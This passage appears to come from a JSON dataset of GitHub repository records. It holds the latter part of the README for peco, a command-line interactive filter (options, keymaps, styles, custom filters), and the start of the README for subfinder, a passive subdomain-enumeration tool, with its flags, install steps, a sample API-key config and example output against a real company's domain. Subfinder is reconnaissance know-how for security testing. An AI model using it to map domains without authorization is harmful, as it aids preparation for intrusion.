`IgnoreCase|CaseSensitive|SmartCase|Regexp|Fuzzy`\\n\\nSpecifies the initial filter to use upon start up. You should specify the name of the filter like `IgnoreCase`, `CaseSensitive`, `SmartCase`, `Regexp` and `Fuzzy`. Default is `IgnoreCase`.\\n\\n### --prompt\\n\\nSpecifies the query line's prompt string. When specified, takes precedence over the configuration file's `Prompt` section. The default value is `QUERY>`.\\n\\n### --layout `top-down|bottom-up`\\n\\nSpecifies the display layout. Default is `top-down`, where query prompt is at the top, followed by the list, then the system status message line. `bottom-up` changes this to the list first (displayed in reverse order), the query prompt, and then the system status message line.\\n\\nFor `percol` users, `--layout=bottom-up` is almost equivalent of `--prompt-bottom --result-bottom-up`.\\n\\n### --select-1\\n\\nWhen specified *and* the input contains exactly 1 line, peco skips prompting you for a choice, and selects the only line in the input and immediately exits.\\n\\nIf there are multiple lines in the input, the usual selection view is displayed.\\n\\n### --on-cancel `success|error`\\n\\nSpecifies the exit status to use when the user cancels the query execution.\\nFor historical and back-compatibility reasons, the default is `success`, meaning if the user cancels the query, the exit status is 0. When you choose `error`, peco will exit with a non-zero value.\\n\\n### --selection-prefix `string`\\n\\nWhen specified, peco uses the specified prefix instead of changing line color to indicate currently selected line(s). default is to use colors. This option is experimental.\\n\\n### --exec `string`\\n\\nWhen specified, peco executes the specified external command (via shell), with peco's currently selected line(s) as its input from STDIN.\\n\\nUpon exiting from the external command, the control goes back to peco where you can keep browsing your search buffer, and to possibly execute your external command repeatedly afterwards.\\n\\nTo exit out of peco when running in this mode, you must execute the Cancel command, usually the escape key.\\n\\n# Configuration File\\n\\npeco by default consults a few locations for the config files.\\n\\n1. Location specified in --rcfile. If this doesn't exist, peco complains and exits\\n2. $XDG\\\\_CONFIG\\\\_HOME/peco/config.json\\n3. $HOME/.config/peco/config.json\\n4. for each directory listed in $XDG\\\\_CONFIG\\\\_DIRS, $DIR/peco/config.json\\n5. If all else fails, $HOME/.peco/config.json\\n\\nBelow are configuration sections that you may specify in your config file:\\n\\n* [Global](#global)\\n* [Keymaps](#keymaps)\\n* [Styles](#styles)\\n* [CustomFilter](#customfilter)\\n* [Prompt](#prompt)\\n* [InitialMatcher](#initialmatcher)\\n* [Use256Color](#use256color)\\n\\n## Global\\n\\nGlobal configurations that change the global behavior.\\n\\n### Prompt\\n\\nYou can change the query line's prompt, which is `QUERY>` by default.\\n\\n```json\\n{\\n \\\"Prompt\\\": \\\"[peco]\\\"\\n}\\n```\\n\\n### InitialMatcher\\n\\n*InitialMatcher* has been deprecated. Please use `InitialFilter` instead.\\n\\n### InitialFilter\\n\\nSpecifies the filter name to start peco with. You should specify the name of the filter, such as `IgnoreCase`, `CaseSensitive`, `SmartCase`, `Regexp` and `Fuzzy`.\\n\\n### StickySelection\\n\\n```json\\n{\\n \\\"StickySelection\\\": true\\n}\\n```\\n\\nStickySelection allows selections to persist even between changes to the query.\\nFor example, when you set this to true you can select a few lines, type in a\\nnew query, select those lines, and then delete the query. The result is all\\nthe lines that you selected before and after the modification to the query are\\nleft intact.\\n\\nDefault value for StickySelection is false.\\n\\n### OnCancel\\n\\n```json\\n{\\n \\\"OnCancel\\\": \\\"error\\\"\\n}\\n```\\n\\nOnCancel is equivalent to `--on-cancel` command line option.\\n\\n### MaxScanBufferSize\\n\\n```json\\n{\\n \\\"MaxScanBufferSize\\\": 256\\n}\\n```\\n\\nControls the buffer sized (in kilobytes) used by `bufio.Scanner`, which is\\nresponsible for reading the input lines. If you believe that your input has\\nvery long lines that prohibit peco from reading them, try increasing this number.\\n\\nThe same time, the default MaxScanBuferSize is 256kb.\\n\\n## Keymaps\\n\\nExample:\\n\\n```json\\n{\\n \\\"Keymap\\\": {\\n \\\"M-v\\\": \\\"peco.ScrollPageUp\\\",\\n \\\"C-v\\\": \\\"peco.ScrollPageDown\\\",\\n \\\"C-x,C-c\\\": \\\"peco.Cancel\\\"\\n }\\n}\\n```\\n\\n### Key sequences\\n\\nAs of v0.2.0, you can use a list of keys (separated by comma) to register an action that is associated with a key sequence (instead of a single key). Please note that if there is a conflict in the key map, *the longest sequence always wins*. So In the above example, if you add another sequence, say, `C-x,C-c,C-c`, then the above `peco.Cancel` will never be invoked.\\n\\n### Combined actions\\n\\nAs of v0.2.1, you can create custom combined actions. For example, if you find yourself repeatedly needing to select 4 lines out of the list, you may want to define your own action like this:\\n\\n```json\\n{\\n \\\"Action\\\": {\\n \\\"foo.SelectFour\\\": [\\n \\\"peco.ToggleRangeMode\\\",\\n \\\"peco.SelectDown\\\",\\n \\\"peco.SelectDown\\\",\\n \\\"peco.SelectDown\\\",\\n \\\"peco.ToggleRangeMode\\\"\\n ]\\n },\\n \\\"Keymap\\\": {\\n \\\"M-f\\\": \\\"foo.SelectFour\\\"\\n }\\n}\\n```\\n\\nThis creates a new combined action `foo.SelectFour` (the format of the name is totally arbitrary, I just like to put namespaces), and assigns that action to `M-f`. When it's fired, it toggles the range selection mode and highlights 4 lines, and then goes back to waiting for your input.\\n\\nAs a similar example, a common idiom in emacs is that `C-c C-c` means \\\"take the contents of this buffer and accept it\\\", whatever that means. This adds exactly that keybinding:\\n\\n```json\\n{\\n \\\"Action\\\": {\\n \\\"selectAllAndFinish\\\": [\\n \\\"peco.SelectAll\\\",\\n \\\"peco.Finish\\\"\\n ]\\n },\\n \\\"Keymap\\\": {\\n \\\"C-c,C-c\\\": \\\"selectAllAndFinish\\\"\\n }\\n}\\n```\\n\\n### Available keys\\n\\nSince v0.1.8, in addition to values below, you may put a `M-` prefix on any\\nkey item to use Alt/Option key as a mask.\\n\\n| Name | Notes |\\n|-------------|-------|\\n| C-a ... C-z | Control + whatever character |\\n| C-2 ... C-8 | Control + 2..8 |\\n| C-[ ||\\n| C-] ||\\n| C-~ ||\\n| C-\\\\_ ||\\n| C-\\\\\\\\\\\\\\\\ | Note that you need to escape the backslash |\\n| C-/ ||\\n| C-Space ||\\n| F1 ... F12 ||\\n| Esc ||\\n| Tab ||\\n| Enter ||\\n| Insert ||\\n| Delete ||\\n| BS ||\\n| BS2 ||\\n| Home ||\\n| End ||\\n| Pgup ||\\n| Pgdn ||\\n| ArrowUp ||\\n| ArrowDown ||\\n| ArrowLeft ||\\n| ArrowRight ||\\n| MouseLeft ||\\n| MouseMiddle ||\\n| MouseRight ||\\n\\n\\n### Key workarounds\\n\\nSome keys just... don't map correctly / too easily for various reasons. Here, we'll list possible workarounds for key sequences that are often asked for:\\n\\n\\n| You want this | Use this instead | Notes |\\n|---------------|------------------|-------------------|\\n| Shift+Tab | M-\\\\[,Z | Verified on macOS |\\n\\n### Available actions\\n\\n| Name | Notes |\\n|------|-------|\\n| peco.ForwardChar | Move caret forward 1 character |\\n| peco.BackwardChar | Move caret backward 1 character |\\n| peco.ForwardWord | Move caret forward 1 word |\\n| peco.BackwardWord | Move caret backward 1 word|\\n| peco.BackToInitialFilter| Switch to first filter in the list |\\n| peco.BeginningOfLine | Move caret to the beginning of line |\\n| peco.EndOfLine | Move caret to the end of line |\\n| peco.EndOfFile | Delete one character forward, otherwise exit from peco with failure status |\\n| peco.DeleteForwardChar | Delete one character forward |\\n| peco.DeleteBackwardChar | Delete one character backward |\\n| peco.DeleteForwardWord | Delete one word forward |\\n| peco.DeleteBackwardWord | Delete one word backward |\\n| peco.InvertSelection | Inverts the selected lines |\\n| peco.KillBeginningOfLine | Delete the characters under the cursor backward until the beginning of the line |\\n| peco.KillEndOfLine | Delete the characters under the cursor until the end of the line |\\n| peco.DeleteAll | Delete all entered characters |\\n| peco.RefreshScreen | Redraws the screen. Note that this effectively re-runs your query |\\n| peco.SelectPreviousPage | (DEPRECATED) Alias to ScrollPageUp |\\n| peco.SelectNextPage | (DEPRECATED) Alias to ScrollPageDown |\\n| peco.ScrollPageDown | Moves the selected line cursor for an entire page, downwards |\\n| peco.ScrollPageUp | Moves the selected line cursor for an entire page, upwards |\\n| peco.SelectUp | Moves the selected line cursor to one line above |\\n| peco.SelectDown | Moves the selected line cursor to one line below |\\n| peco.SelectPrevious | (DEPRECATED) Alias to SelectUp |\\n| peco.SelectNext | (DEPRECATED) Alias to SelectDown |\\n| peco.ScrollLeft | Scrolls the screen to the left |\\n| peco.ScrollRight | Scrolls the screen to the right |\\n| peco.ScrollFirstItem | Scrolls to the first item (in the entire buffer, not the current screen) |\\n| peco.ScrollLastItem | Scrolls to the last item (in the entire buffer, not the current screen) |\\n| peco.ToggleSelection | Selects the current line, and saves it |\\n| peco.ToggleSelectionAndSelectNext | Selects the current line, saves it, and proceeds to the next line |\\n| peco.ToggleSingleKeyJump | Enables SingleKeyJump mode a.k.a. \\\"hit-a-hint\\\" |\\n| peco.SelectNone | Remove all saved selections |\\n| peco.SelectAll | Selects the all line, and save it |\\n| peco.SelectVisible | Selects the all visible line, and save it |\\n| peco.ToggleSelectMode | (DEPRECATED) Alias to ToggleRangeMode |\\n| peco.CancelSelectMode | (DEPRECATED) Alias to CancelRangeMode |\\n| peco.ToggleQuery | Toggle list between filterd by query and not filterd. |\\n| peco.ToggleRangeMode | Start selecting by range, or append selecting range to selections |\\n| peco.CancelRangeMode | Finish selecting by range and cancel range selection |\\n| peco.RotateMatcher | (DEPRECATED) Use peco.RotateFilter |\\n| peco.RotateFilter | Rotate between filters (by default, ignore-case/no-ignore-case)|\\n| peco.Finish | Exits from peco with success status |\\n| peco.Cancel | Exits from peco with failure status, or cancel select mode |\\n\\n\\n### Default Keymap\\n\\nNote: If in case below keymap seems wrong, check the source code in [keymap.go](https://github.com/peco/peco/blob/master/keymap.go) (look for NewKeymap).\\n\\n|Key|Action|\\n|---|------|\\n|Esc|peco.Cancel|\\n|C-c|peco.Cancel|\\n|Enter|peco.Finish|\\n|C-f|peco.ForwardChar|\\n|C-a|peco.BeginningOfLine|\\n|C-b|peco.BackwardChar|\\n|C-d|peco.DeleteForwardChar|\\n|C-e|peco.EndOfLine|\\n|C-k|peco.KillEndOfLine|\\n|C-u|peco.KillBeginningOfLine|\\n|BS|peco.DeleteBackwardChar|\\n|C-8|peco.DeleteBackwardChar|\\n|C-w|peco.DeleteBackwardWord|\\n|C-g|peco.SelectNone|\\n|C-n|peco.SelectDown|\\n|C-p|peco.SelectUp|\\n|C-r|peco.RotateFilter|\\n|C-t|peco.ToggleQuery|\\n|C-Space|peco.ToggleSelectionAndSelectNext|\\n|ArrowUp|peco.SelectUp|\\n|ArrowDown|peco.SelectDown|\\n|ArrowLeft|peco.ScrollPageUp|\\n|ArrowRight|peco.ScrollPageDown|\\n\\n## Styles\\n\\nFor now, styles of following 5 items can be customized in `config.json`.\\n\\n```json\\n{\\n \\\"Style\\\": {\\n \\\"Basic\\\": [\\\"on_default\\\", \\\"default\\\"],\\n \\\"SavedSelection\\\": [\\\"bold\\\", \\\"on_yellow\\\", \\\"white\\\"],\\n \\\"Selected\\\": [\\\"underline\\\", \\\"on_cyan\\\", \\\"black\\\"],\\n \\\"Query\\\": [\\\"yellow\\\", \\\"bold\\\"],\\n \\\"Matched\\\": [\\\"red\\\", \\\"on_blue\\\"]\\n }\\n}\\n```\\n\\n- `Basic` for not selected lines\\n- `SavedSelection` for lines of saved selection\\n- `Selected` for a currently selecting line\\n- `Query` for a query line\\n- `Matched` for a query matched word\\n\\n### Foreground Colors\\n\\n- `\\\"black\\\"` for `termbox.ColorBlack`\\n- `\\\"red\\\"` for `termbox.ColorRed`\\n- `\\\"green\\\"` for `termbox.ColorGreen`\\n- `\\\"yellow\\\"` for `termbox.ColorYellow`\\n- `\\\"blue\\\"` for `termbox.ColorBlue`\\n- `\\\"magenta\\\"` for `termbox.ColorMagenta`\\n- `\\\"cyan\\\"` for `termbox.ColorCyan`\\n- `\\\"white\\\"` for `termbox.ColorWhite`\\n- `\\\"0\\\"`-`\\\"255\\\"` for 256color ([Use256Color](#use256color) must be enabled)\\n\\n### Background Colors\\n\\n- `\\\"on_black\\\"` for `termbox.ColorBlack`\\n- `\\\"on_red\\\"` for `termbox.ColorRed`\\n- `\\\"on_green\\\"` for `termbox.ColorGreen`\\n- `\\\"on_yellow\\\"` for `termbox.ColorYellow`\\n- `\\\"on_blue\\\"` for `termbox.ColorBlue`\\n- `\\\"on_magenta\\\"` for `termbox.ColorMagenta`\\n- `\\\"on_cyan\\\"` for `termbox.ColorCyan`\\n- `\\\"on_white\\\"` for `termbox.ColorWhite`\\n- `\\\"on_0\\\"`-`\\\"on_255\\\"` for 256color ([Use256Color](#use256color) must be enabled)\\n\\n### Attributes\\n\\n- `\\\"bold\\\"` for fg: `termbox.AttrBold`\\n- `\\\"underline\\\"` for fg: `termbox.AttrUnderline`\\n- `\\\"reverse\\\"` for fg: `termbox.AttrReverse`\\n- `\\\"on_bold\\\"` for bg: `termbox.AttrBold` (this attribute actually makes the background blink on some platforms/environments, e.g. linux console, xterm...)\\n\\n## CustomFilter\\n\\nThis is an experimental feature. Please note that some details of this specification may change\\n\\nBy default `peco` comes with `IgnoreCase`, `CaseSensitive`, `SmartCase`, `Regexp` and `Fuzzy` filters, but since v0.1.3, it is possible to create your own custom filter.\\n\\nThe filter will be executed via `Command.Run()` as an external process, and it will be passed the query values in the command line, and the original unaltered buffer is passed via `os.Stdin`. Your filter must perform the matching, and print out to `os.Stdout` matched lines. Your filter MAY be called multiple times if the buffer\\ngiven to peco is big enough. See `BufferThreshold` below.\\n\\nNote that currently there is no way for the custom filter to specify where in the line the match occurred, so matched portions in the string WILL NOT BE HIGHLIGHTED.\\n\\nThe filter does not need to be a go program. It can be a perl/ruby/python/bash script, or anything else that is executable.\\n\\nOnce you have a filter, you must specify how the matcher is spawned:\\n\\n```json\\n{\\n \\\"CustomFilter\\\": {\\n \\\"MyFilter\\\": {\\n \\\"Cmd\\\": \\\"/path/to/my-matcher\\\",\\n \\\"Args\\\": [ \\\"$QUERY\\\" ],\\n \\\"BufferThreshold\\\": 100\\n }\\n }\\n}\\n```\\n\\n`Cmd` specifies the command name. This must be searcheable via `exec.LookPath`.\\n\\nElements in the `Args` section are string keys to array of program arguments. The special token `$QUERY` will be replaced with the unaltered query as the user typed in (i.e. multiple-word queries will be passed as a single string). You may pass in any other arguments in this array. If you omit this in your config, a default value of `[]string{\\\"$QUERY\\\"}` will be used\\n\\n`BufferThreshold` specifies that the filter command should be invoked when peco has this many lines to process\\nin the buffer. For example, if you are using peco against a 1000-line input, and your `BufferThreshold` is 100 (which is the default), then your filter will be invoked 10 times. For obvious reasons, the larger this threshold is, the faster the overall performance will be, but the longer you will have to wait to see the filter results.\\n\\nYou may specify as many filters as you like in the `CustomFilter` section.\\n\\n### Examples\\n\\n* [An example of a simple perl regexp matcher](https://gist.github.com/mattn/24712964da6e3112251c)\\n* [An example using migemogrep Japanese grep using latin-1 chars](https://github.com/peco/peco/wiki/CustomFilter)\\n\\n## Layout\\n\\nSee --layout.\\n\\n## SingleKeyJump\\n\\n```\\n{\\n \\\"SingleKeyJump\\\": {\\n \\\"ShowPrefix\\\": true\\n }\\n}\\n```\\n\\n## SelectionPrefix\\n\\n`SelectionPrefix` is equivalent to using `--selection-prefix` in the command line.\\n\\n```\\n{\\n \\\"SelectionPrefix\\\": \\\">\\\"\\n}\\n```\\n\\n## Use256Color\\n\\nBoolean value that determines whether or not to use 256color. The default is `false`.\\n\\nNote: This has no effect on Windows because Windows console does not support extra color modes.\\n\\n```json\\n{\\n \\\"Use256Color\\\": true\\n}\\n```\\n\\n# FAQ\\n\\n## Does peco work on (msys2|cygwin)?\\n\\nNo. https://github.com/peco/peco/issues/336#issuecomment-243939696\\n(Updated Feb 23, 2017: \\\"Maybe\\\" on cygwin https://github.com/peco/peco/issues/336#issuecomment-281912949)\\n\\n## Non-latin fonts (e.g. Japanese) look weird on my Windows machine...?\\n\\nAre you using raster fonts? https://github.com/peco/peco/issues/341\\n\\n## Seeing escape sequences `[200~` and `[201~` when pasting text?\\n\\nDisable bracketed paste mode. https://github.com/peco/peco/issues/417\\n\\n# Hacking\\n\\nFirst, fork this repo, and get your clone locally.\\n\\n1. Make sure you have [go](http://golang.org) installed, with GOPATH appropriately set\\n2. Make sure you have `make` installed\\n3. Run `make installdeps` (You only need to do this once)\\n\\nTo test, run\\n\\n```\\nmake test\\n```\\n\\nTo build, run\\n\\n```\\nmake build\\n```\\n\\nThis will create a `peco` binary in `$(RELEASE_DIR)/peco_$(GOOS)_$(GOARCH)/peco$(SUFFIX)`. Or, of course, you can just run\\n\\n```\\ngo build cmd/peco/peco.go\\n```\\n\\nwhich will create the binary in the local directory.\\n\\n# TODO\\n\\nUnit test it.\\n\\n# AUTHORS\\n\\n* Daisuke Maki (lestrrat)\\n* mattn\\n* syohex\\n\\n# CONTRIBUTORS\\n\\n* HIROSE Masaaki\\n* Joel Segerlind\\n* Lukas Lueg\\n* Mitsuoka Mimura\\n* Ryota Arai\\n* Shinya Ohyanagi\\n* Takashi Kokubun\\n* Yuya Takeyama\\n* cho45\\n* cubicdaiya\\n* kei\\\\_q\\n* negipo\\n* sona\\\\_tar\\n* sugyan\\n* swdyh\\n* MURAOKA Taro (kaoriya/koron), for aho-corasick search\\n* taichi, for the gif working on Windows\\n* uobikiemukot\\n* Samuel Lemaitre\\n* Yousuke Ushiki\\n* Linda\\\\_pp\\n* Tomohiro Nishimura (Sixeight)\\n* Naruki Tanabe (narugit)\\n\\n# Notes\\n\\nObviously, kudos to the original percol: https://github.com/mooz/percol\\nMuch code stolen from https://github.com/mattn/gof\\n\\n# Table of Contents\\n\\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\\n\\n\\n- [peco](#peco)\\n- [Description](#description)\\n - [Demo](#demo)\\n- [Features](#features)\\n - [Incremental Search](#incremental-search)\\n - [Select Multiple Lines](#select-multiple-lines)\\n - [Select Range Of Lines](#select-range-of-lines)\\n - [Select Filters](#select-filters)\\n - [Selectable Layout](#selectable-layout)\\n - [Works on Windows!](#works-on-windows)\\n- [Installation](#installation)\\n - [Just want the binary?](#just-want-the-binary)\\n - [macOS (Homebrew, Scarf)](#macos-homebrew-scarf)\\n - [Debian and Ubuntu based distributions (APT, Scarf)](#debian-and-ubuntu-based-distributions-apt-scarf)\\n - [Void Linux (XBPS)](#void-linux-xbps)\\n - [Arch Linux (AUR)](#arch-linux-aur)\\n - [Windows (Chocolatey NuGet Users)](#windows-chocolatey-nuget-users)\\n - [Building peco yourself](#building-peco-yourself)\\n - [go get IS NOT RECOMMENDED](#go-get-is-not-recommended)\\n- [Command Line Options](#command-line-options)\\n - [-h, --help](#-h---help)\\n - [--version](#--version)\\n - [--query <query>](#--query-query)\\n - [--print-query](#--print-query)\\n - [--rcfile <filename>](#--rcfile-filename)\\n - [-b, --buffer-size <num>](#-b---buffer-size-num)\\n - [--null](#--null)\\n - [--initial-index](#--initial-index)\\n - [--initial-filter `IgnoreCase|CaseSensitive|SmartCase|Regexp|Fuzzy`](#--initial-filter-ignorecasecasesensitivesmartcaseregexpfuzzy)\\n - [--prompt](#--prompt)\\n - [--layout `top-down|bottom-up`](#--layout-top-downbottom-up)\\n - [--select-1](#--select-1)\\n - [--on-cancel `success|error`](#--on-cancel-successerror)\\n - [--selection-prefix `string`](#--selection-prefix-string)\\n - [--exec `string`](#--exec-string)\\n- [Configuration File](#configuration-file)\\n - [Global](#global)\\n - [Prompt](#prompt)\\n - [InitialMatcher](#initialmatcher)\\n - [InitialFilter](#initialfilter)\\n - [StickySelection](#stickyselection)\\n - [OnCancel](#oncancel)\\n - [MaxScanBufferSize](#maxscanbuffersize)\\n - [Keymaps](#keymaps)\\n - [Key sequences](#key-sequences)\\n - [Combined actions](#combined-actions)\\n - [Available keys](#available-keys)\\n - [Key workarounds](#key-workarounds)\\n - [Available actions](#available-actions)\\n - [Default Keymap](#default-keymap)\\n - [Styles](#styles)\\n - [Foreground Colors](#foreground-colors)\\n - [Background Colors](#background-colors)\\n - [Attributes](#attributes)\\n - [CustomFilter](#customfilter)\\n - [Examples](#examples)\\n - [Layout](#layout)\\n - [SingleKeyJump](#singlekeyjump)\\n - [SelectionPrefix](#selectionprefix)\\n - [Use256Color](#use256color)\\n- [FAQ](#faq)\\n - [Does peco work on (msys2|cygwin)?](#does-peco-work-on-msys2cygwin)\\n - [Non-latin fonts (e.g. Japanese) look weird on my Windows machine...?](#non-latin-fonts-eg-japanese-look-weird-on-my-windows-machine)\\n - [Seeing escape sequences `[200~` and `[201~` when pasting text?](#seeing-escape-sequences-200-and-201-when-pasting-text)\\n- [Hacking](#hacking)\\n- [TODO](#todo)\\n- [AUTHORS](#authors)\\n- [CONTRIBUTORS](#contributors)\\n- [Notes](#notes)\\n- [Table of Contents](#table-of-contents)\\n\\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\\n\"", "topics": ["cli"], "writeup": "Command line filtering tool. Pipe data into Peco and interactively filter the results.\n", "ignoredescription": true, "id": 73, "full_name": "peco/peco", "url": "https://github.com/peco/peco", "topic_string": "cli"},
{"tags": [], "owner": "projectdiscovery", "description": "Subfinder is a subdomain discovery tool that discovers valid subdomains for websites. Designed as a passive framework to be useful for bug bounties and safe for penetration testing.", "name": "subfinder", "topics_string": "", "language": "Go", "readme": "\"<h1 align=\\\"left\\\">\\n <img src=\\\"static/subfinder-logo.png\\\" alt=\\\"subfinder\\\" width=\\\"170px\\\"></a>\\n <br>\\n</h1>\\n\\n\\n[![License](https://img.shields.io/badge/license-MIT-_red.svg)](https://opensource.org/licenses/MIT)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/projectdiscovery/subfinder)](https://goreportcard.com/report/github.com/projectdiscovery/subfinder)\\n[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/projectdiscovery/subfinder/issues)\\n[![GitHub Release](https://img.shields.io/github/release/projectdiscovery/subfinder)](https://github.com/projectdiscovery/subfinder/releases)\\n[![Follow on Twitter](https://img.shields.io/twitter/follow/pdiscoveryio.svg?logo=twitter)](https://twitter.com/pdiscoveryio)\\n[![Docker Images](https://img.shields.io/docker/pulls/projectdiscovery/subfinder.svg)](https://hub.docker.com/r/projectdiscovery/subfinder)\\n[![Chat on Discord](https://img.shields.io/discord/695645237418131507.svg?logo=discord)](https://discord.gg/KECAGdH)\\n\\n\\n\\nsubfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources. It has a simple modular architecture and is optimized for speed. subfinder is built for doing one thing only - passive subdomain enumeration, and it does that very well.\\n\\nWe have designed subfinder to comply with all passive sources licenses, and usage restrictions, as well as maintained a consistently passive model to make it useful to both penetration testers and bug bounty hunters alike.\\n\\n\\n# Resources\\n- [Features](#features)\\n- [Usage](#usage)\\n- [Installation Instuctions (direct)](#direct-installation)\\n- [Installation Instructions](#installation-instructions)\\n - [From Binary](#from-binary)\\n - [From Source](#from-source)\\n - [From Github](#from-github)\\n- [Upgrading](#upgrading)\\n- [Post Installation Instructions](#post-installation-instructions)\\n- [Running subfinder](#running-subfinder)\\n- [Running in a Docker Container](#running-in-a-docker-container)\\n\\n\\n # Features\\n\\n<h1 align=\\\"left\\\">\\n <img src=\\\"static/subfinder-run.png\\\" alt=\\\"subfinder\\\" width=\\\"700px\\\"></a>\\n <br>\\n</h1>\\n\\n\\n - Simple and modular code base making it easy to contribute.\\n - Fast And Powerful Resolution and wildcard elimination module\\n - **Curated** passive sources to maximize results (35 Sources as of now)\\n - Multiple Output formats supported (Json, File, Stdout)\\n - Optimized for speed, very fast and **lightweight** on resources\\n - **Stdin** and **stdout** support for integrating in workflows\\n\\n\\n# Usage\\n\\n```sh\\nsubfinder -h\\n```\\nThis will display help for the tool. Here are all the switches it supports.\\n\\n| Flag | Description | Example |\\n|------|-------------|---------|\\n| -all | Use all sources (slow) for enumeration | subfinder -d uber.com -all |\\n| -cd | Upload results to the Chaos API (api-key required) | subfinder -d uber.com -cd |\\n| -config string | Configuration file for API Keys, etc | subfinder -config config.yaml |\\n| -d | Domain to find subdomains for | subfinder -d uber.com |\\n| -dL | File containing list of domains to enumerate | subfinder -dL hackerone-hosts.txt |\\n| -exclude-sources | List of sources to exclude from enumeration | subfinder -exclude-sources archiveis |\\n| -max-time | Minutes to wait for enumeration results (default 10) | subfinder -max-time 1 |\\n| -nC | Don't Use colors in output | subfinder -nC |\\n| -nW | Remove Wildcard & Dead Subdomains from output | subfinder -nW |\\n| -ls | List all available sources | subfinder -ls |\\n| -o | File to write output to (optional) | subfinder -o output.txt |\\n| -oD | Directory to write enumeration results to (optional) | subfinder -oD ~/outputs |\\n| -oI | Write output in Host,IP format | subfinder -oI |\\n| -oJ | Write output in JSON lines Format | subfinder -oJ |\\n| -r | Comma-separated list of resolvers to use | subfinder -r 1.1.1.1,1.0.0.1 |\\n| -rL | Text file containing list of resolvers to use | subfinder -rL resolvers.txt\\n| -recursive | Enumeration recursive subdomains | subfinder -d news.yahoo.com -recursive\\n| -silent | Show only subdomains in output | subfinder -silent |\\n| -sources | Comma separated list of sources to use | subfinder -sources shodan,censys |\\n| -t | Number of concurrent goroutines for resolving (default 10) | subfinder -t 100 |\\n| -timeout | Seconds to wait before timing out (default 30) | subfinder -timeout 30 |\\n| -v | \\tShow Verbose output | subfinder -v |\\n| -version | Show current program version | subfinder -version |\\n\\n\\n# Installation Instructions\\n\\n### From Binary\\n\\nThe installation is easy. You can download the pre-built binaries for different platforms from the [releases](https://github.com/projectdiscovery/subfinder/releases/) page. Extract them using tar, move it to your `$PATH` and you're ready to go.\\n\\n```sh\\n\\u25b6 # download release from https://github.com/projectdiscovery/subfinder/releases/\\n\\u25b6 tar -xzvf subfinder-linux-amd64.tar.gz\\n\\u25b6 mv subfinder /usr/local/bin/\\n\\u25b6 subfinder -h\\n```\\n\\n### From Source\\n\\nsubfinder requires go1.14+ to install successfully. Run the following command to get the repo -\\n\\n```sh\\nGO111MODULE=auto go get -u -v github.com/projectdiscovery/subfinder/cmd/subfinder\\n```\\n\\n### From Github\\n\\n```sh\\ngit clone https://github.com/projectdiscovery/subfinder.git\\ncd subfinder/cmd/subfinder\\ngo build .\\nmv subfinder /usr/local/bin/\\nsubfinder -h\\n```\\n\\n### Upgrading\\nIf you wish to upgrade the package you can use:\\n\\n```sh\\nGO111MODULE=auto go get -u -v github.com/projectdiscovery/subfinder/cmd/subfinder\\n```\\n\\n## Post Installation Instructions\\n\\nSubfinder will work after using the installation instructions however to configure Subfinder to work with certain services, you will need to have setup API keys. The following services do not work without an API key:\\n\\n- [Binaryedge](https://binaryedge.io)\\n- [Certspotter](https://sslmate.com/certspotter/api/)\\n- [Censys](https://censys.io)\\n- [Chaos](https://chaos.projectdiscovery.io)\\n- [DnsDB](https://api.dnsdb.info)\\n- [Github](https://github.com)\\n- [Intelx](https://intelx.io)\\n- [Passivetotal](http://passivetotal.org)\\n- [Recon.dev](https://recon.dev)\\n- [Robtex](https://www.robtex.com/api/)\\n- [SecurityTrails](http://securitytrails.com)\\n- [Shodan](https://shodan.io)\\n- [Spyse](https://spyse.com)\\n- [Threatbook](https://threatbook.cn/api)\\n- [Virustotal](https://www.virustotal.com)\\n- [Zoomeye](https://www.zoomeye.org)\\n\\nTheses values are stored in the `$HOME/.config/subfinder/config.yaml` file which will be created when you run the tool for the first time. The configuration file uses the YAML format. Multiple API keys can be specified for each of these services from which one of them will be used for enumeration.\\n\\nFor sources that require multiple keys, namely `Censys`, `Passivetotal`, they can be added by separating them via a colon (:).\\n\\nAn example config file -\\n\\n```yaml\\nresolvers:\\n - 1.1.1.1\\n - 1.0.0.1\\nsources:\\n - binaryedge\\n - bufferover\\n - censys\\n - passivetotal\\n - sitedossier\\nbinaryedge:\\n - 0bf8919b-aab9-42e4-9574-d3b639324597\\n - ac244e2f-b635-4581-878a-33f4e79a2c13\\ncensys:\\n - ac244e2f-b635-4581-878a-33f4e79a2c13:dd510d6e-1b6e-4655-83f6-f347b363def9\\ncertspotter: []\\npassivetotal:\\n - sample-email@user.com:sample_password\\nsecuritytrails: []\\nshodan:\\n - AAAAClP1bJJSRMEYJazgwhJKrggRwKA\\ngithub:\\n - d23a554bbc1aabb208c9acfbd2dd41ce7fc9db39\\n - asdsd54bbc1aabb208c9acfbd2dd41ce7fc9db39\\n```\\n\\n# Running Subfinder\\n\\nTo run the tool on a target, just use the following command.\\n```sh\\n\\u25b6 subfinder -d freelancer.com\\n```\\n\\nThis will run the tool against freelancer.com. There are a number of configuration options that you can pass along with this command. The verbose switch (-v) can be used to display verbose information.\\n\\n```\\n[threatcrowd] ns1.hosting.freelancer.com\\n[threatcrowd] ns2.hosting.freelancer.com\\n[threatcrowd] flash.freelancer.com\\n[threatcrowd] auth.freelancer.com\\n[chaos] alertmanager.accounts.freelancer.com\\n[chaos] analytics01.freelancer.com\\n[chaos] apidocs.freelancer.com\\n[chaos] brains.freelancer.com\\n[chaos] consul.accounts.freelancer.com\\n```\\n\\nThe `-silent` switch can be used to show only subdomains found without any other info.\\n\\n\\nThe `-o` command can be used to specify an output file.\\n\\n```sh\\n\\u25b6 subfinder -d freelancer.com -o output.txt\\n```\\n\\nTo run the tool on a list of domains, `-dL` option can be used. This requires a directory to write the output files. Subdomains for each domain from the list are written in a text file in the directory specified by the `-oD` flag with their name being the domain name.\\n\\n```sh\\n\\u25b6 cat domains.txt\\nhackerone.com\\ngoogle.com\\n\\n\\u25b6 subfinder -dL domains.txt -oD ~/path/to/output\\n\\u25b6 ls ~/path/to/output\\n\\nhackerone.com.txt\\ngoogle.com.txt\\n```\\n\\nYou can also get output in json format using `-oJ` switch. This switch saves the output in the JSON lines format.\\n\\nIf you use the JSON format, or the `Host:IP` format, then it becomes mandatory for you to use the **-nW** format as resolving is essential for these output format. By default, resolving the found subdomains is disabled.\\n\\n```sh\\n\\u25b6 subfinder -d 